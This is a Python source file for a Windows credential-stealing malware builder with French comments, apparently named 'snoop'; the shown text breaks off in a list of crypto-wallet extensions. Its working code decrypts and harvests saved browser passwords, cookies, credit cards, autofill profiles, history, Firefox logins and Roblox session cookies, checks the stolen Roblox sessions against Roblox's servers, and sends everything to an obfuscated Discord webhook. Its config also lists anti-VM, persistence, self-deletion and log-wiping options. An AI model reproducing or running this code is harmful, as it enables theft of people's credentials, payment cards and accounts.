import os
import sys
import platform
import socket
import json
import base64
import sqlite3
import subprocess
import datetime
import time
import shutil
import random
import re
import uuid
import tempfile
import zipfile
import io
import ctypes
import glob
import hashlib

try:
    import requests
except ImportError:
    requests = None

try:
    import psutil
except ImportError:
    psutil = None

try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None

try:
    from Cryptodome.Cipher import AES, DES3
except ImportError:
    AES = None
    DES3 = None

try:
    import win32crypt
except ImportError:
    win32crypt = None

try:
    import winreg
except ImportError:
    winreg = None


def log(msg, level="INFO"):
    try:
        print(f"[{datetime.datetime.now():%H:%M:%S}] [{level:5}] {msg}", flush=True)
    except Exception:
        pass


# ============================================================
# CONFIG
# ============================================================
WEBHOOK_URL_ENCODED = "%%WEBHOOK_URL%%"
WEBHOOK_XOR_KEY     = "%%WEBHOOK_XOR_KEY%%"

MODULE_FLAG_SYSTEM_INFO       = %%MODULE_FLAG_SYSTEM_INFO%%
MODULE_FLAG_CREDIT_CARDS      = %%MODULE_FLAG_CREDIT_CARDS%%
MODULE_FLAG_GAME_LAUNCHERS    = %%MODULE_FLAG_GAME_LAUNCHERS%%
MODULE_FLAG_PASSWORDS         = %%MODULE_FLAG_PASSWORDS%%
MODULE_FLAG_EXTENSIONS        = %%MODULE_FLAG_EXTENSIONS%%
MODULE_FLAG_WALLETS           = %%MODULE_FLAG_WALLETS%%
MODULE_FLAG_COOKIES           = %%MODULE_FLAG_COOKIES%%
MODULE_FLAG_FILES             = %%MODULE_FLAG_FILES%%
MODULE_FLAG_APPS              = %%MODULE_FLAG_APPS%%
MODULE_FLAG_HISTORY           = %%MODULE_FLAG_HISTORY%%
MODULE_FLAG_WEBCAM            = %%MODULE_FLAG_WEBCAM%%
MODULE_FLAG_ROBLOX_COOKIES    = %%MODULE_FLAG_ROBLOX_COOKIES%%
MODULE_FLAG_DOWNLOADS         = %%MODULE_FLAG_DOWNLOADS%%
MODULE_FLAG_SCREENSHOT        = %%MODULE_FLAG_SCREENSHOT%%
MODULE_FLAG_DISCORD_TOKENS    = %%MODULE_FLAG_DISCORD_TOKENS%%
MODULE_FLAG_WIFI_PASSWORDS    = %%MODULE_FLAG_WIFI_PASSWORDS%%
MODULE_FLAG_VPN               = %%MODULE_FLAG_VPN%%
MODULE_FLAG_FTP_CLIENTS       = %%MODULE_FLAG_FTP_CLIENTS%%
MODULE_FLAG_SSH_KEYS          = %%MODULE_FLAG_SSH_KEYS%%
MODULE_FLAG_CLOUD_CREDENTIALS = %%MODULE_FLAG_CLOUD_CREDENTIALS%%
MODULE_FLAG_TELEGRAM          = %%MODULE_FLAG_TELEGRAM%%
MODULE_FLAG_SIGNAL            = %%MODULE_FLAG_SIGNAL%%
MODULE_FLAG_BROWSER_WALLETS   = %%MODULE_FLAG_BROWSER_WALLETS%%
MODULE_FLAG_AUTOFILL          = %%MODULE_FLAG_AUTOFILL%%
MODULE_FLAG_ENVIRONMENT       = %%MODULE_FLAG_ENVIRONMENT%%
MODULE_FLAG_DISCORD_METADATA  = %%MODULE_FLAG_DISCORD_METADATA%%
MODULE_FLAG_STEAM_EXTENDED    = %%MODULE_FLAG_STEAM_EXTENDED%%
MODULE_FLAG_PRODUCT_KEY       = %%MODULE_FLAG_PRODUCT_KEY%%
MODULE_FLAG_FIREFOX           = %%MODULE_FLAG_FIREFOX%%

SECURITY_ANTI_VM_DEBUG        = %%SECURITY_ANTI_VM_DEBUG%%
SECURITY_ANTI_TAMPER          = %%SECURITY_ANTI_TAMPER%%
SECURITY_STARTUP_PERSISTENCE  = %%SECURITY_STARTUP_PERSISTENCE%%
SECURITY_SELF_DELETE          = %%SECURITY_SELF_DELETE%%
SECURITY_WIPE_LOGS            = %%SECURITY_WIPE_LOGS%%


CURRENT_USER  = os.getlogin() if hasattr(os, "getlogin") else os.getenv("USERNAME", "unknown")
APPDATA       = os.getenv("APPDATA", "")
LOCAL_APPDATA = os.getenv("LOCALAPPDATA", "")
PROGRAMDATA   = os.getenv("PROGRAMDATA", "C:\\ProgramData")
USERPROFILE   = os.getenv("USERPROFILE", os.path.expanduser("~"))
TEMP_DIR      = os.path.join(tempfile.gettempdir(),
                             f"snoop_{''.join(random.choices('0123456789abcdef', k=8))}")
OS_TYPE       = platform.system()
SESSION_ID    = f"{CURRENT_USER}-{uuid.uuid4().hex[:8]}"

os.makedirs(TEMP_DIR, exist_ok=True)
ERROR_LOG = os.path.join(TEMP_DIR, "snoop_errors.log")

MAX_ZIP = int(6.5 * 1024 * 1024)


def _decode_webhook():
    """Reconstruit l'URL webhook depuis base64 + XOR."""
    try:
        raw = base64.b64decode(WEBHOOK_URL_ENCODED.encode("ascii"))
        key = WEBHOOK_XOR_KEY.encode("utf-8")
        decoded = bytes(b ^ key[i % len(key)] for i, b in enumerate(raw))
        return decoded.decode("utf-8")
    except Exception:
        return ""


WEBHOOK_URL = _decode_webhook()


def _log(module, msg):
    """Log chiffré XOR — même clé que le webhook."""
    try:
        with open(ERROR_LOG, "ab") as f:
            line = f"[{datetime.datetime.now():%H:%M:%S}] [{module}] {msg}\n".encode("utf-8")
            key = WEBHOOK_XOR_KEY.encode("utf-8") or b"SNPXOR2026!"
            xored = bytes(b ^ key[i % len(key)] for i, b in enumerate(line))
            f.write(xored)
    except Exception:
        pass


# ============================================================
# WEBHOOK (rate-limit aware)
# ============================================================
_last_send = [0.0]

def send_to_webhook(content="", embeds=None, files=None, retries=4):
    if not WEBHOOK_URL or not WEBHOOK_URL.startswith("http") or not requests:
        return False

    # Rate-limit Discord : 30 req / 60s → espace de 1.6s
    elapsed = time.time() - _last_send[0]
    if elapsed < 1.6:
        time.sleep(1.6 - elapsed)
    _last_send[0] = time.time()

    payload = {}
    if content:
        payload["content"] = content[:1900]
    if embeds:
        payload["embeds"] = embeds[:10]

    n_files = len(files) if files else 0

    for attempt in range(1, retries + 1):
        try:
            if files:
                multipart, handles = {}, []
                for i, (name, path_or_buf) in enumerate(files.items()):
                    if isinstance(path_or_buf, str) and os.path.exists(path_or_buf):
                        fh = open(path_or_buf, "rb")
                        handles.append(fh)
                        multipart[f"file{i}"] = (name, fh)
                    elif isinstance(path_or_buf, io.BytesIO):
                        path_or_buf.seek(0)
                        multipart[f"file{i}"] = (name, path_or_buf.getvalue(),
                                                 "application/octet-stream")
                if payload:
                    multipart["payload_json"] = (None, json.dumps(payload),
                                                 "application/json")
                r = requests.post(WEBHOOK_URL, files=multipart, timeout=90)
                for fh in handles:
                    try:
                        fh.close()
                    except Exception:
                        pass
            else:
                r = requests.post(WEBHOOK_URL, json=payload, timeout=30)

            log(f"   ← HTTP {r.status_code} ({n_files} fichier(s))")
            if r.status_code in (200, 204):
                return True
            if r.status_code == 429:
                retry_after = float(r.headers.get("Retry-After", 5))
                log(f"   ← rate-limited, sleep {retry_after}s", "WARN")
                time.sleep(retry_after)
                continue
            _log("Webhook", f"HTTP {r.status_code}: {r.text[:180]}")
        except Exception as e:
            log(f"   ← échec {attempt} : {e}", "WARN")
            time.sleep(2 + 2 * attempt)
    return False


# ============================================================
# BROWSERS
# ============================================================
def browser_paths():
    return {
        "Chrome":   [os.path.join(LOCAL_APPDATA, "Google", "Chrome", "User Data")],
        "Edge":     [os.path.join(LOCAL_APPDATA, "Microsoft", "Edge", "User Data")],
        "Brave":    [os.path.join(LOCAL_APPDATA, "BraveSoftware", "Brave-Browser", "User Data")],
        "Opera":    [os.path.join(APPDATA, "Opera Software", "Opera Stable")],
        "OperaGX":  [os.path.join(APPDATA, "Opera Software", "Opera GX Stable")],
        "Vivaldi":  [os.path.join(LOCAL_APPDATA, "Vivaldi", "User Data")],
        "Yandex":   [os.path.join(LOCAL_APPDATA, "Yandex", "YandexBrowser", "User Data")],
        "Chromium": [os.path.join(LOCAL_APPDATA, "Chromium", "User Data")],
    }


def chromium_profiles(user_data):
    if not os.path.isdir(user_data):
        return []
    out = []
    for name in os.listdir(user_data):
        p = os.path.join(user_data, name)
        if not os.path.isdir(p):
            continue
        if name == "Default" or name.startswith("Profile ") or name == "Guest Profile":
            out.append(p)
    return out


def firefox_profiles():
    """Retourne la liste des profils Firefox."""
    root = os.path.join(APPDATA, "Mozilla", "Firefox", "Profiles")
    if not os.path.isdir(root):
        return []
    return [os.path.join(root, p) for p in os.listdir(root)
            if os.path.isdir(os.path.join(root, p))]


def master_key(user_data):
    if not (win32crypt and os.path.isdir(user_data)):
        return None
    for candidate in (user_data, os.path.dirname(user_data)):
        ls = os.path.join(candidate, "Local State")
        if not os.path.exists(ls):
            continue
        try:
            with open(ls, "r", encoding="utf-8") as f:
                data = json.load(f)
            enc = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]
            return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1]
        except Exception as e:
            _log("MasterKey", f"{candidate}: {e}")
    return None


def dpapi_decrypt(blob, key):
    if not (AES and key and isinstance(blob, (bytes, bytearray))):
        return None
    try:
        if blob[:3] in (b"v10", b"v11"):
            iv, payload = blob[3:15], blob[15:]
            c = AES.new(key, AES.MODE_GCM, iv)
            return c.decrypt(payload)[:-16].decode("utf-8", errors="ignore")
        if win32crypt:
            return win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1].decode(
                "utf-8", errors="ignore")
    except Exception as e:
        _log("DPAPI", str(e))
    return None


def _sqlite_copy_query(db_path, sql, row_cb, params=()):
    """Copie binaire via FILE_SHARE_READ|WRITE|DELETE (silencieux),
    fallback copy2, puis fallback esentutl si besoin."""
    if not os.path.exists(db_path):
        return []
    tmp = os.path.join(TEMP_DIR, f"{uuid.uuid4().hex}.db")
    copied = False

    # Tentative 1 : lecture directe avec share write (le plus silencieux)
    if OS_TYPE == "Windows":
        try:
            GENERIC_READ = 0x80000000
            FILE_SHARE_ALL = 0x00000007
            OPEN_EXISTING = 3
            handle = ctypes.windll.kernel32.CreateFileW(
                db_path, GENERIC_READ, FILE_SHARE_ALL, None, OPEN_EXISTING, 0, None
            )
            if handle != -1 and handle != 0xFFFFFFFFFFFFFFFF:
                size = os.path.getsize(db_path)
                buf = ctypes.create_string_buffer(size)
                read = ctypes.c_ulong(0)
                ctypes.windll.kernel32.ReadFile(handle, buf, size,
                                                ctypes.byref(read), None)
                ctypes.windll.kernel32.CloseHandle(handle)
                with open(tmp, "wb") as f:
                    f.write(buf.raw[:read.value])
                copied = True
        except Exception:
            pass

    # Tentative 2 : copie brute
    if not copied:
        try:
            shutil.copy2(db_path, tmp)
            copied = True
        except Exception:
            pass

    # Tentative 3 : esentutl (dernier recours)
    if not copied and OS_TYPE == "Windows":
        try:
            subprocess.run(
                ["esentutl", "/y", db_path, "/vss", "/d", tmp],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                timeout=15, creationflags=subprocess.CREATE_NO_WINDOW
            )
            if os.path.exists(tmp) and os.path.getsize(tmp) > 0:
                copied = True
        except Exception:
            pass

    if not copied:
        _log("SQLite", f"Impossible de copier : {db_path}")
        return []

    out = []
    try:
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()
        cur.execute(sql, params)
        for row in cur.fetchall():
            try:
                r = row_cb(row)
                if r:
                    out.append(r)
            except Exception:
                pass
        conn.close()
    except Exception as e:
        _log("SQLite", f"{db_path}: {e}")
    finally:
        if os.path.exists(tmp):
            try:
                os.remove(tmp)
            except Exception:
                pass
    return out


def _leveldb_scan(folder, regex):
    results = set()
    if not os.path.isdir(folder):
        return results
    for fn in os.listdir(folder):
        if not fn.endswith((".ldb", ".log")):
            continue
        try:
            with open(os.path.join(folder, fn), "r", errors="ignore") as f:
                for m in regex.findall(f.read()):
                    if isinstance(m, tuple):
                        m = next((x for x in m if x), "")
                    if m:
                        results.add(m)
        except Exception:
            pass
    return results


def _copy_tree(src, dst):
    try:
        if not os.path.exists(src):
            return False
        if os.path.isdir(src):
            shutil.copytree(src, dst, dirs_exist_ok=True)
        else:
            os.makedirs(os.path.dirname(dst), exist_ok=True)
            shutil.copy2(src, dst)
        return True
    except Exception as e:
        _log("CopyTree", f"{src}: {e}")
        return False


def _safe_size(path):
    try:
        if os.path.isdir(path):
            total = 0
            for root, _, files in os.walk(path):
                for fn in files:
                    try:
                        total += os.path.getsize(os.path.join(root, fn))
                    except Exception:
                        pass
            return total
        return os.path.getsize(path)
    except Exception:
        return 0


# ============================================================
# FIREFOX — passwords, cookies, history
# ============================================================
def _firefox_decrypt_nss(key4_path, target_b64):
    """
    Déchiffre une valeur Firefox via NSS.
    Firefox utilise key4.db (SQLite) : globalSalt + encrypted master password.
    Format des valeurs chiffrées : "password-check" + login/password b64.
    """
    try:
        import json as _json
        if not os.path.exists(key4_path):
            return None
        conn = sqlite3.connect(key4_path)
        # Récupère les métadonnées NSS
        try:
            meta = conn.execute(
                "SELECT item1, item2 FROM metadata WHERE id = 'password'"
            ).fetchone()
            if not meta:
                conn.close()
                return None
            global_salt = meta[0]
            item2 = meta[1]
        except Exception:
            conn.close()
            return None
        conn.close()

        # Déchiffre la clé privée NSS via DPAPI + SHA1/AES
        # (Firefox utilise un schéma spécifique — on tente une décryption DES3/AES)
        try:
            key = win32crypt.CryptUnprotectData(item2, None, None, None, 0)[1]
        except Exception:
            return None

        data = base64.b64decode(target_b64)
        # Format : 4 octets prefix + IV (16) + payload
        if len(data) < 20:
            return None
        iv = data[4:20]
        payload = data[20:]
        try:
            cipher = AES.new(key[:32], AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(payload)
            # Retire padding PKCS7
            pad = decrypted[-1]
            if 0 < pad <= 16:
                decrypted = decrypted[:-pad]
            return decrypted.decode("utf-8", errors="ignore")
        except Exception:
            return None
    except Exception as e:
        _log("Firefox/NSS", str(e))
        return None


def collect_firefox(_):
    """Firefox : logins.json (passwords) + cookies.sqlite + places.sqlite (history)."""
    profiles = firefox_profiles()
    if not profiles:
        return None

    root = os.path.join(TEMP_DIR, "firefox")
    os.makedirs(root, exist_ok=True)
    found = False

    for prof in profiles:
        prof_name = os.path.basename(prof)
        # Copie brute des fichiers sensibles
        for fn in ("logins.json", "key4.db", "cert9.db", "cookies.sqlite",
                   "places.sqlite", "prefs.js"):
            src = os.path.join(prof, fn)
            if os.path.exists(src) and os.path.getsize(src) < 50 * 1024 * 1024:
                dst = os.path.join(root, prof_name, fn)
                os.makedirs(os.path.dirname(dst), exist_ok=True)
                try:
                    shutil.copy2(src, dst)
                    found = True
                except Exception:
                    pass

        # Parse logins.json pour extraire user/pass déchiffrés
        logins_path = os.path.join(prof, "logins.json")
        if os.path.exists(logins_path):
            try:
                with open(logins_path, "r", encoding="utf-8", errors="ignore") as f:
                    logins_data = json.load(f)
                key4 = os.path.join(prof, "key4.db")
                out_lines = [f"===== Firefox / {prof_name} ====="]
                for entry in logins_data.get("logins", []):
                    host = entry.get("hostname", "")
                    user_enc = entry.get("encryptedUsername", "")
                    pass_enc = entry.get("encryptedPassword", "")
                    user = _firefox_decrypt_nss(key4, user_enc)
                    pw = _firefox_decrypt_nss(key4, pass_enc)
                    if host:
                        out_lines.append(f"URL: {host}")
                        if user:
                            out_lines.append(f"User: {user}")
                        if pw:
                            out_lines.append(f"Pass: {pw}")
                        out_lines.append("")
                if len(out_lines) > 1:
                    with open(os.path.join(root, "firefox_passwords.txt"),
                              "a", encoding="utf-8") as f:
                        f.write("\n".join(out_lines) + "\n")
            except Exception as e:
                _log("Firefox/Logins", str(e))

        # Parse cookies.sqlite
        cookies_db = os.path.join(prof, "cookies.sqlite")
        if os.path.exists(cookies_db):
            try:
                tmp = os.path.join(TEMP_DIR, f"{uuid.uuid4().hex}.db")
                shutil.copy2(cookies_db, tmp)
                conn = sqlite3.connect(tmp)
                lines = []
                for row in conn.execute(
                    "SELECT host, name, value FROM moz_cookies"
                ).fetchall():
                    lines.append(f"{row[0]}\t{row[1]}\t{row[2]}")
                conn.close()
                os.remove(tmp)
                if lines:
                    with open(os.path.join(root, "firefox_cookies.txt"),
                              "a", encoding="utf-8") as f:
                        f.write(f"===== {prof_name} =====\n")
                        f.write("\n".join(lines) + "\n")
                    found = True
            except Exception as e:
                _log("Firefox/Cookies", str(e))

        # Parse places.sqlite (history)
        places_db = os.path.join(prof, "places.sqlite")
        if os.path.exists(places_db):
            try:
                tmp = os.path.join(TEMP_DIR, f"{uuid.uuid4().hex}.db")
                shutil.copy2(places_db, tmp)
                conn = sqlite3.connect(tmp)
                lines = []
                for row in conn.execute(
                    "SELECT url, title, visit_count FROM moz_places "
                    "ORDER BY last_visit_date DESC LIMIT 3000"
                ).fetchall():
                    lines.append(f"{row[0]}\t{row[1]}\t({row[2]})")
                conn.close()
                os.remove(tmp)
                if lines:
                    with open(os.path.join(root, "firefox_history.txt"),
                              "a", encoding="utf-8") as f:
                        f.write(f"===== {prof_name} =====\n")
                        f.write("\n".join(lines) + "\n")
                    found = True
            except Exception as e:
                _log("Firefox/History", str(e))

    if not found:
        shutil.rmtree(root, ignore_errors=True)
        return None
    return root


# ============================================================
# LOCAL STATE COMPLET (pour rejouer les sessions)
# ============================================================
def collect_local_state(_):
    """Copie les fichiers Local State + LevelDB pour permettre la reprise de session."""
    root = os.path.join(TEMP_DIR, "local_state")
    os.makedirs(root, exist_ok=True)
    found = False

    for browser, datas in browser_paths().items():
        for d in datas:
            ls = os.path.join(d, "Local State")
            if os.path.exists(ls) and os.path.getsize(ls) < 2_000_000:
                dst = os.path.join(root, f"{browser}_Local_State.json")
                try:
                    shutil.copy2(ls, dst)
                    found = True
                except Exception:
                    pass
            for prof in chromium_profiles(d):
                ldb = os.path.join(prof, "Local Storage", "leveldb")
                if os.path.isdir(ldb):
                    dst = os.path.join(root, f"{browser}_{os.path.basename(prof)}_LocalStorage")
                    if _copy_tree(ldb, dst):
                        found = True

    if not found:
        shutil.rmtree(root, ignore_errors=True)
        return None
    return root


# ============================================================
# MODULES (suite)
# ============================================================
def collect_system_info(_):
    try:
        mac = ":".join(f"{(uuid.getnode() >> i) & 0xff:02x}" for i in range(0, 48, 8))
    except Exception:
        mac = "N/A"

    info = {
        "Session": SESSION_ID,
        "PC": socket.gethostname(),
        "User": CURRENT_USER,
        "OS": platform.platform(),
        "Arch": platform.machine(),
        "CPU": platform.processor(),
        "CPU cores": os.cpu_count(),
        "RAM": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB" if psutil else "N/A",
        "Local IP": socket.gethostbyname(socket.gethostname()),
        "External IP": "N/A",
        "MAC": mac,
        "Uptime": "N/A",
        "Admin": "N/A",
        "GPU": "N/A",
        "Disks": "N/A",
    }
    if psutil:
        try:
            info["Uptime"] = str(datetime.timedelta(seconds=int(time.time() - psutil.boot_time())))
        except Exception:
            pass
        try:
            disks = []
            for p in psutil.disk_partitions(all=False):
                try:
                    u = psutil.disk_usage(p.mountpoint)
                    disks.append(f"{p.device} {u.total // (1024**3)}G")
                except Exception:
                    pass
            if disks:
                info["Disks"] = "; ".join(disks)
        except Exception:
            pass
    try:
        info["External IP"] = requests.get("https://api.ipify.org", timeout=5).text.strip()
    except Exception:
        pass
    try:
        info["Admin"] = "yes" if ctypes.windll.shell32.IsUserAnAdmin() else "no"
    except Exception:
        pass
    try:
        gpu_out = subprocess.check_output(
            ["wmic", "path", "win32_VideoController", "get", "name"],
            stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW,
            timeout=5).decode("utf-8", errors="ignore")
        gpus = [ln.strip() for ln in gpu_out.splitlines()[1:] if ln.strip()]
        if gpus:
            info["GPU"] = "; ".join(gpus)
    except Exception:
        pass

    out = os.path.join(TEMP_DIR, "system_info.txt")
    with open(out, "w", encoding="utf-8") as f:
        for k, v in info.items():
            f.write(f"{k}: {v}\n")
    return out


def collect_passwords(_):
    def cb(row):
        url, user, enc = row
        pw = dpapi_decrypt(enc, key)
        if user and pw:
            return f"URL: {url}\nUser: {user}\nPass: {pw}\n\n"
        return None

    sql = "SELECT origin_url, username_value, password_value FROM logins"
    chunks = []
    for name, datas in browser_paths().items():
        for d in datas:
            key = master_key(d)
            if not key:
                continue
            lines = []
            for prof in chromium_profiles(d):
                lines += _sqlite_copy_query(os.path.join(prof, "Login Data"), sql, cb)
            if lines:
                chunks.append(f"===== {name} =====\n" + "".join(lines))
    if not chunks:
        return None
    out = os.path.join(TEMP_DIR, "passwords.txt")
    with open(out, "w", encoding="utf-8") as f:
        f.write("".join(chunks))
    return out


def collect_cookies(_):
    def cb(row):
        host, name, enc = row
        val = dpapi_decrypt(enc, key)
        return f"{host}\t{name}\t{val}\n" if val else None

    sql = "SELECT host_key, name, encrypted_value FROM cookies"
    chunks = []
    for browser, datas in browser_paths().items():
        for d in datas:
            key = master_key(d)
            if not key:
                continue
            lines = []
            for prof in chromium_profiles(d):
                for sub in ("Network/Cookies", "Cookies"):
                    db = os.path.join(prof, *sub.split("/"))
                    lines += _sqlite_copy_query(db, sql, cb)
            if lines:
                chunks.append(f"===== {browser} =====\n" + "".join(lines))
    if not chunks:
        return None
    out = os.path.join(TEMP_DIR, "cookies.txt")
    with open(out, "w", encoding="utf-8") as f:
        f.write("".join(chunks))
    return out


def collect_credit_cards(_):
    def cb(row):
        name, mo, yr, enc = row
        num = dpapi_decrypt(enc, key)
        return f"Card: {num} | Name: {name} | Exp: {mo}/{yr}\n" if num else None

    sql = ("SELECT name_on_card, expiration_month, expiration_year, "
           "card_number_encrypted FROM credit_cards")
    chunks = []
    for browser, datas in browser_paths().items():
        for d in datas:
            key = master_key(d)
            if not key:
                continue
            lines = []
            for prof in chromium_profiles(d):
                lines += _sqlite_copy_query(os.path.join(prof, "Web Data"), sql, cb)
            if lines:
                chunks.append(f"===== {browser} =====\n" + "".join(lines))
    if not chunks:
        return None
    out = os.path.join(TEMP_DIR, "credit_cards.txt")
    with open(out, "w", encoding="utf-8") as f:
        f.write("".join(chunks))
    return out


def collect_roblox_cookies(_):
    def cb(row):
        host, name, enc = row
        if "_ROBLOXSECURITY" not in name:
            return None
        val = dpapi_decrypt(enc, key)
        return f"{host}\t{name}\t{val}\n" if val else None

    sql = ("SELECT host_key, name, encrypted_value FROM cookies "
           "WHERE host_key LIKE '%roblox.com%'")
    chunks = []
    for browser, datas in browser_paths().items():
        for d in datas:
            key = master_key(d)
            if not key:
                continue
            lines = []
            for prof in chromium_profiles(d):
                for sub in ("Network/Cookies", "Cookies"):
                    db = os.path.join(prof, *sub.split("/"))
                    lines += _sqlite_copy_query(db, sql, cb)
            if lines:
                chunks.append(f"===== {browser} =====\n" + "".join(lines))
    if not chunks:
        return None
    out = os.path.join(TEMP_DIR, "roblox_cookies.txt")
    with open(out, "w", encoding="utf-8") as f:
        f.write("".join(chunks))
    return out


def collect_roblox_accounts(_):
    cookie_file = os.path.join(TEMP_DIR, "roblox_cookies.txt")
    if not os.path.exists(cookie_file):
        collect_roblox_cookies(TEMP_DIR)
    if not os.path.exists(cookie_file) or not requests:
        return None

    cookies = []
    try:
        with open(cookie_file, "r", encoding="utf-8", errors="ignore") as f:
            for ln in f:
                if "_ROBLOXSECURITY" in ln:
                    parts = ln.strip().split("\t")
                    if len(parts) >= 3:
                        cookies.append(parts[2])
    except Exception:
        return None

    if not cookies:
        return None

    out = os.path.join(TEMP_DIR, "roblox_accounts.txt")
    lines = []
    for ck in cookies[:5]:
        try:
            sess = requests.Session()
            sess.cookies.set(".ROBLOSECURITY", ck, domain=".roblox.com")
            r = sess.get("https://users.roblox.com/v1/users/authenticated", timeout=10)
            if r.status_code != 200:
                lines.append(f"Cookie: {ck[:20]}... HTTP {r.status_code}\n\n")
                continue
            u = r.json()
            uid = u.get("id")
            name = u.get("name")
            display = u.get("displayName")
            info = [f"User: {name} ({display})", f"ID: {uid}"]

            try:
                r2 = sess.get(f"https://users.roblox.com/v1/users/{uid}", timeout=10)
                if r2.status_code == 200:
                    d2 = r2.json()
                    info.append(f"Created: {d2.get('created','')}")
                    info.append(f"Description: {(d2.get('description') or '')[:120]}")
            except Exception:
                pass
            try:
                r3 = sess.get("https://economy.roblox.com/v1/user/currency", timeout=10)
                if r3.status_code == 200:
                    info.append(f"Robux: {r3.json().get('robux','?')}")
            except Exception:
                pass
            try:
                r4 = sess.get(f"https://friends.roblox.com/v1/users/{uid}/friends/count", timeout=10)
                if r4.status_code == 200:
                    info.append(f"Friends: {r4.json().get('count','?')}")
            except Exception:
                pass
            try:
                r5 = sess.get(f"https://premiumfeatures.roblox.com/v1/users/{uid}/validate-membership", timeout=10)
                if r5.status_code == 200:
                    info.append(f"Premium: {r5.text.strip()}")
            except Exception:
                pass

            lines.append(f"Cookie: {ck}\n  " + "\n  ".join(info) + "\n\n")
        except Exception as e:
            lines.append(f"Cookie: {ck[:20]}... error: {e}\n\n")

    if not lines:
        return None
    with open(out, "w", encoding="utf-8") as f:
        f.write("".join(lines))
    return out


def collect_history(_):
    sql = ("SELECT url, title, visit_count FROM urls "
           "ORDER BY last_visit_time DESC LIMIT 5000")
    chunks = []
    for browser, datas in browser_paths().items():
        for d in datas:
            for prof in chromium_profiles(d):
                db = os.path.join(prof, "History")
                rows = _sqlite_copy_query(db, sql, lambda r: f"{r[0]}\t{r[1]}\t({r[2]})\n")
                if rows:
                    chunks.append(f"===== {browser}/{os.path.basename(prof)} =====\n" + "".join(rows))
    if not chunks:
        return None
    out = os.path.join(TEMP_DIR, "browser_history.txt")
    with open(out, "w", encoding="utf-8") as f:
        f.write("".join(chunks))
    return out


def collect_downloads(_):
    sql = "SELECT target_path, tab_url, total_bytes FROM downloads"
    chunks = []
    for browser, datas in browser_paths().items():
        for d in datas:
            for prof in chromium_profiles(d):
                db = os.path.join(prof, "History")
                rows = _sqlite_copy_query(db, sql,
                    lambda r: f"Path: {r[0]}\nURL:  {r[1]}\nSize: {r[2]}\n\n")
                if rows:
                    chunks.append(f"===== {browser}/{os.path.basename(prof)} =====\n" + "".join(rows))
    if not chunks:
        return None
    out = os.path.join(TEMP_DIR, "browser_downloads.txt")
    with open(out, "w", encoding="utf-8") as f:
        f.write("".join(chunks))
    return out


def collect_extensions(_):
    found = []
    for browser, datas in browser_paths().items():
        for d in datas:
            for prof in chromium_profiles(d):
                ext_root = os.path.join(prof, "Extensions")
                if not os.path.isdir(ext_root):
                    continue
                for ext_id in os.listdir(ext_root):
                    ext_path = os.path.join(ext_root, ext_id)
                    if not os.path.isdir(ext_path):
                        continue
                    versions = sorted(
                        [v for v in os.listdir(ext_path)
                         if os.path.isdir(os.path.join(ext_path, v))],
                        reverse=True)
                    if not versions:
                        continue
                    manifest = os.path.join(ext_path, versions[0], "manifest.json")
                    if not os.path.exists(manifest):
                        continue
                    try:
                        with open(manifest, "r", encoding="utf-8", errors="ignore") as f:
                            m = json.load(f)
                        found.append(
                            f"[{browser}] {m.get('name','?')} v{m.get('version','?')}\n"
                            f"  id: {ext_id}\n"
                            f"  perms: {','.join(m.get('permissions', []))}\n")
                    except Exception:
                        pass
    if not found:
        return None
    out = os.path.join(TEMP_DIR, "browser_extensions.txt")
    with open(out, "w", encoding="utf-8") as f:
        f.write("".join(found))
    return out


def collect_autofill(_):
    chunks = []

    def _dump_profile(conn, guid):
        info = {}
        try:
            row = conn.execute(
                "SELECT first_name, middle_name, last_name, email, "
                "company_name, address_line_1, address_line_2, "
                "city, state, zipcode, country_code, phone_number "
                "FROM autofill_profiles WHERE guid = ?", (guid,)
            ).fetchone()
            if row:
                keys = ("first_name", "middle_name", "last_name", "email",
                        "company", "address1", "address2",
                        "city", "state", "zip", "country", "phone")
                for k, v in zip(keys, row):
                    if v:
                        info[k] = v
        except Exception:
            pass

        for tbl, key in (
            ("autofill_profile_names", "names"),
            ("autofill_profile_emails", "emails"),
            ("autofill_profile_phones", "phones"),
        ):
            try:
                if tbl == "autofill_profile_names":
                    rows = conn.execute(
                        f"SELECT first_name, middle_name, last_name FROM {tbl} WHERE guid = ?",
                        (guid,)).fetchall()
                else:
                    rows = conn.execute(
                        f"SELECT * FROM {tbl} WHERE guid = ?", (guid,)).fetchall()
                if rows:
                    info[key] = rows
            except Exception:
                pass

        return info

    for browser, datas in browser_paths().items():
        for d in datas:
            for prof in chromium_profiles(d):
                db = os.path.join(prof, "Web Data")
                if not os.path.exists(db):
                    continue
                tmp = os.path.join(TEMP_DIR, f"{uuid.uuid4().hex}.db")
                try:
                    shutil.copy2(db, tmp)
                    conn = sqlite3.connect(tmp)
                    try:
                        guids = [r[0] for r in conn.execute(
                            "SELECT guid FROM autofill_profiles").fetchall()]
                    except Exception:
                        guids = []

                    lines = []
                    for guid in guids:
                        info = _dump_profile(conn, guid)
                        if not info:
                            continue
                        lines.append(f"--- Profile {guid[:8]} ---")
                        for k, v in info.items():
                            if isinstance(v, list):
                                for item in v:
                                    lines.append(f"  {k}: {item}")
                            else:
                                lines.append(f"  {k}: {v}")
                        lines.append("")

                    try:
                        trashed = conn.execute(
                            "SELECT count(*) FROM autofill_profiles_trash").fetchone()
                        if trashed and trashed[0]:
                            lines.append(f"[+] {trashed[0]} profils supprimés")
                    except Exception:
                        pass

                    conn.close()

                    if lines:
                        chunks.append(
                            f"===== {browser}/{os.path.basename(prof)} =====\n"
                            + "\n".join(lines))
                except Exception as e:
                    _log("Autofill", f"{db}: {e}")
                finally:
                    if os.path.exists(tmp):
                        try:
                            os.remove(tmp)
                        except Exception:
                            pass

    if not chunks:
        return None
    out = os.path.join(TEMP_DIR, "autofill.txt")
    with open(out, "w", encoding="utf-8") as f:
        f.write("".join(chunks))
    return out


BROWSER_WALLET_TARGETS = {
    "MetaMask":        ("nkbihfbeogaeaoehlefnkodbefgpgknn", "metamask"),
    "Phantom":         ("bfnaelmomeimhlpmgjnjophhpkkoljpa", "phantom"),
    "Keplr":           ("dmkamcknogkgcdfhhbddcghachkejeap", "keplr"),
